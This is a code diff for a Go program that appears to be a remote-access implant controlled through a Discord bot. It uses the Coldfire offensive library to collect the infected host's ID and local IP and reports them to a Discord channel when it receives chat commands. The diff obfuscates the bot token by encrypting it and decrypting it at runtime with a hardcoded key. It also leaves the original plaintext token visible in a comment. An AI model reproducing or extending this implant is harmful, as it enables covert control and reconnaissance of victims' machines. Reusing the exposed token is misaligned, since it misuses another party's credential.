@@ -2,16 +2,21 @@ package main
 
 import (
 	"os"
+	"log"
 	"fmt"
 	"syscall"
 	"os/signal"
+	"p0ggers/malfun"
 	"github.com/google/uuid"
 	"github.com/bwmarrin/discordgo"
 	"github.com/redcode-labs/Coldfire"
 )
 
-var CORDTKN string = "MTAyMDAzNjcyNjkzNDIyNDg5Ng.GNmtJ7.bW150vRIwr7LuDbxL_mz15eMmwLS5CsEtachV8"
-var CID string
+// var CORDTKN string = "MTAyMDAzNjcyNjkzNDIyNDg5Ng.GNmtJ7.bW150vRIwr7LuDbxL_mz15eMmwLS5CsEtachV8"
+var (
+	CORDTKN = "fp+uvvLUWRAaVmXPpRNccw"
+	CID string
+)
 
 func GLP() string {
 	ip := coldfire.GetLocalIp()
@@ -38,7 +43,7 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 
 	if m.Content == "!check" {
-		s.ChannelMessageSend(m.ChannelID, "Hi! from " + CID)
+		s.ChannelMessageSend(m.ChannelID, "Yahallo from: " + CID)
 	}
 
 	if m.Content == "!glp" {
@@ -54,7 +59,15 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 func main() {
 	CID = gID() // CLIENT ID
-	cord, err := discordgo.New("Bot " + CORDTKN)
+
+	key := []byte("asuperstrong32bitpasswordgohere!")
+	result, err := malfun.DECPT(key, CORDTKN)
+	fmt.Println(result)
+    if err != nil {
+        log.Fatal(err)
+    }
+
+	cord, err := discordgo.New("Bot " + result)
 	if err != nil {
 		fmt.Println("Error creating Discord session,", err)
 		return
